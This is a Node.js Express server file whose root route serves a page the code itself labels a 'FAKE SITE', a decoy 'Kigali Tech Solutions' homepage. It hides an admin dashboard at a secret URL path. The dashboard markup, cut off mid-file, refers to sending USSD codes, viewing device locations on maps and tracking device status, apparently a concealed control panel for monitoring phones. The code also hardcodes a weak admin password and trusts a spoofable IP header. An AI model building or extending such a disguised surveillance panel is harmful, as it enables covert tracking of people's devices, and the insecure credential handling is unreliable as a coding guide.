// server.js – COMPLETE VERSION with Base64 Background Image
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const SECRET_PATH = 'a9f3k217';
const ADMIN_USER = 'admin';
const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');

const failedAttempts = {};

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || req.connection.remoteAddress;
}

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// FAKE SITE – Kigali Convention Center Background (Base64)
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Kigali Tech Solutions</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
                    min-height: 100vh;
                    background: #0a0e17;
                    color: #fff;
                    overflow-x: hidden;
                }

                .hero {
                    position: relative;
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    text-align: center;
                    padding: 40px 20px;
                    background: #0a0e17;
                }

                .hero-bg {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: 
                        linear-gradient(135deg, rgba(10,14,23,0.6) 0%, rgba(10,14,23,0.2) 100%),
                        url('data:image/jpeg;base64,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') center/cover no-repeat;
                    z-index: 0;
                }

                .car-container {
                    position: absolute;
                    bottom: 5%;
                    width: 100%;
                    z-index: 1;
                    display: flex;
                    justify-content: space-around;
                    padding: 0 20px;
                    opacity: 0.25;
                }
                .car {
                    display: inline-block;
                    font-size: 48px;
                    filter: drop-shadow(0 0 20px rgba(79,195,247,0.1));
                    animation: floatCar 4s ease-in-out infinite;
                }
                .car:nth-child(2) { animation-delay: 0.5s; font-size: 56px; }
                .car:nth-child(3) { animation-delay: 1s; font-size: 42px; }
                .car:nth-child(4) { animation-delay: 1.5s; font-size: 52px; }

                @keyframes floatCar {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-8px); }
                }

                .hero-content {
                    position: relative;
                    z-index: 2;
                    max-width: 800px;
                }

                .hero-logo {
                    font-size: 72px;
                    margin-bottom: 10px;
                    display: block;
                }

                .hero-title {
                    font-size: 52px;
                    font-weight: 700;
                    background: linear-gradient(135deg, #4fc3f7 0%, #7c4dff 50%, #4fc3f7 100%);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    background-size: 200% 200%;
                    animation: gradientMove 4s ease-in-out infinite;
                    letter-spacing: -1px;
                }

                @keyframes gradientMove {
                    0%, 100% { background-position: 0% 50%; }
                    50% { background-position: 100% 50%; }
                }

                .hero-subtitle {
                    font-size: 20px;
                    color: #8896ab;
                    margin: 16px 0 8px;
                    font-weight: 300;
                    letter-spacing: 2px;
                }

                .hero-tagline {
                    font-size: 16px;
                    color: #4a5568;
                    margin-bottom: 30px;
                    font-weight: 300;
                }

                .hero-divider {
                    width: 80px;
                    height: 2px;
                    background: linear-gradient(90deg, #4fc3f7, #7c4dff);
                    margin: 20px auto 30px;
                    border: none;
                }

                .features {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                    gap: 20px;
                    margin-top: 30px;
                }
                .feature-item {
                    background: rgba(17, 25, 39, 0.6);
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(79, 195, 247, 0.08);
                    border-radius: 12px;
                    padding: 16px 12px;
                    transition: all 0.3s ease;
                }
                .feature-item:hover {
                    border-color: rgba(79, 195, 247, 0.25);
                    transform: translateY(-2px);
                }
                .feature-item .icon {
                    font-size: 28px;
                    display: block;
                    margin-bottom: 6px;
                }
                .feature-item .label {
                    font-size: 12px;
                    color: #8896ab;
                    font-weight: 500;
                    letter-spacing: 0.5px;
                }

                .admin-gry-badge {
                    position: fixed;
                    bottom: 15px;
                    right: 15px;
                    font-size: 9px;
                    color: rgba(79,195,247,0.04);
                    font-family: 'Courier New', monospace;
                    letter-spacing: 3px;
                    user-select: none;
                    pointer-events: none;
                    z-index: 999;
                }

                @media (max-width: 768px) {
                    .hero-title { font-size: 32px; }
                    .hero-subtitle { font-size: 16px; }
                    .hero-logo { font-size: 48px; }
                    .car { font-size: 32px !important; }
                    .features { grid-template-columns: repeat(2, 1fr); }
                }
                @media (max-width: 480px) {
                    .hero-title { font-size: 24px; }
                    .hero-subtitle { font-size: 14px; }
                    .car-container { display: none; }
                }
            </style>
        </head>
        <body>

        <div class="admin-gry-badge">ADMIN GRY</div>

        <section class="hero">
            <div class="hero-bg"></div>

            <div class="car-container">
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
            </div>

            <div class="hero-content">
                <span class="hero-logo">🏎️</span>
                <h1 class="hero-title">Kigali Tech Solutions</h1>
                <p class="hero-subtitle">INNOVATING THE FUTURE OF RACING TECHNOLOGY</p>
                <div class="hero-divider"></div>
                <p class="hero-tagline">Luxury. Performance. Innovation.</p>

                <div class="features">
                    <div class="feature-item">
                        <span class="icon">⚡</span>
                        <span class="label">Electric Performance</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🧠</span>
                        <span class="label">AI-Driven Tech</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🔋</span>
                        <span class="label">Sustainable Energy</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🌍</span>
                        <span class="label">Global Innovation</span>
                    </div>
                </div>
            </div>
        </section>

        </body>
        </html>
    `);
});

// ============================================================
// ADMIN DASHBOARD (full HTML)
// ============================================================
app.get('/a9f3k217', (req, res) => {
    let html = '';
        html += '<!DOCTYPE html>\n';
    html += '<html>\n';
    html += '<head>\n';
    html += '  <meta charset="UTF-8">\n';
    html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
    html += '  <title>Admin Dashboard</title>\n';
    html += '  <style>\n';
    html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
    html += '    body { font-family: "Segoe UI", -apple-system, sans-serif; background: #0a0e17; color: #e0e6ed; padding: 20px; min-height: 100vh; }\n';
    html += '    .container { max-width: 1100px; margin: 0 auto; }\n';
    html += '    .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #1a2332; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }\n';
    html += '    .header-left { display: flex; align-items: center; gap: 15px; }\n';
    html += '    .header-left h1 { font-size: 28px; color: #4fc3f7; font-weight: 700; letter-spacing: -0.5px; }\n';
    html += '    .admin-gry-badge { background: rgba(79,195,247,0.08); color: rgba(79,195,247,0.3); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; border: 1px solid rgba(79,195,247,0.1); user-select: none; }\n';
    html += '    .logout-btn { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.3s; background: none; border: none; }\n';
    html += '    .logout-btn:hover { opacity: 0.7; }\n';
    html += '    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .stat-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; }\n';
    html += '    .stat-card:hover { border-color: #4fc3f7; transform: translateY(-2px); }\n';
    html += '    .stat-card .value { font-size: 32px; font-weight: 700; color: #4fc3f7; line-height: 1.2; }\n';
    html += '    .stat-card .label { font-size: 13px; color: #8896ab; margin-top: 4px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .tool-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; transition: 0.3s; }\n';
    html += '    .tool-card:hover { border-color: #4fc3f7; }\n';
    html += '    .tool-card h4 { font-size: 16px; color: #e0e6ed; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .tool-card h4 .icon { font-size: 20px; }\n';
    html += '    .ussd-input-group { display: flex; gap: 8px; }\n';
    html += '    .ussd-input-group input { flex: 1; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; font-family: "Courier New", monospace; }\n';
    html += '    .ussd-input-group input:focus { outline: none; border-color: #4fc3f7; }\n';
    html += '    .ussd-input-group button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; transition: 0.3s; white-space: nowrap; }\n';
    html += '    .ussd-input-group button:hover { background: #3aa8dd; }\n';
    html += '    .ussd-response { margin-top: 10px; padding: 10px; background: #0a0e17; border-radius: 8px; border: 1px solid #1a2332; font-size: 13px; color: #8896ab; min-height: 50px; max-height: 120px; overflow-y: auto; font-family: "Courier New", monospace; word-wrap: break-word; }\n';
    html += '    .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }\n';
    html += '    .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }\n';
    html += '    .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }\n';
    html += '    .location-info { display: flex; flex-direction: column; gap: 8px; }\n';
    html += '    .location-info .coord { color: #8896ab; font-size: 13px; }\n';
    html += '    .location-info .coord strong { color: #e0e6ed; }\n';
    html += '    .location-info .map-link { color: #4fc3f7; text-decoration: none; font-size: 13px; }\n';
    html += '    .location-info .map-link:hover { text-decoration: underline; }\n';
    html += '    .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px; font-size: 13px; }\n';
    html += '    .device-info-grid .label { color: #8896ab; }\n';
    html += '    .device-info-grid .value { color: #e0e6ed; font-weight: 500; }\n';
    html += '    .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }\n';
    html += '    .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
    html += '    table { width: 100%; border-collapse: collapse; font-size: 14px; }\n';
    html += '    th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }\n';
    html += '    tr:hover td { background: rgba(79,195,247,0.02); }\n';
    html += '    .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }\n';
    html += '    .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
    html += '    .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
    html += '    .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }\n';
    html += '    .empty .icon { font-size: 36px; margin-bottom: 8px; }\n';
    html += '    .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }\n';
    html += '    .login-container .logo { font-size: 48px; margin-bottom: 8px; }\n';
    html += '    .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }\n';
    html += '    .login-container .sub { color: #8896ab; font-size: 14px; margin-bottom: 20px; }\n';
    html += '    .login-container input { width: 100%; padding: 12px 14px; margin: 8px 0; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; transition: 0.3s; }\n';
    html += '    .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }\n';
    html += '    .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
    html += '    .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }\n';
    html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }\n';
    html += '    .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }\n';
    html += '    .hidden { display: none; }\n';
    html += '    @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }\n';
    html += '  </style>\n';
    html += '</head>\n';
    html += '<body>\n';
    html += '<div class="container">\n';
    html += '  <div id="loginContainer" class="login-container">\n';
    html += '    <div class="logo">🔐</div>\n';
    html += '    <h3>Admin Access</h3>\n';
    html += '    <p class="sub">Enter your credentials</p>\n';
    html += '    <input type="text" id="loginUser" placeholder="Username">\n';
    html += '    <input type="password" id="loginPass" placeholder="Password">\n';
    html += '    <button onclick="login()">Login</button>\n';
    html += '    <div id="attemptsMsg" class="attempts-msg"></div>\n';
    html += '    <div id="loginError" class="error"></div>\n';
    html += '  </div>\n';
    html += '  <div id="dashboard" class="hidden">\n';
    html += '    <div class="header">\n';
    html += '      <div class="header-left">\n';
    html += '        <h1>📊 Admin Dashboard</h1>\n';
    html += '        <span class="admin-gry-badge">ADMIN GRY</span>\n';
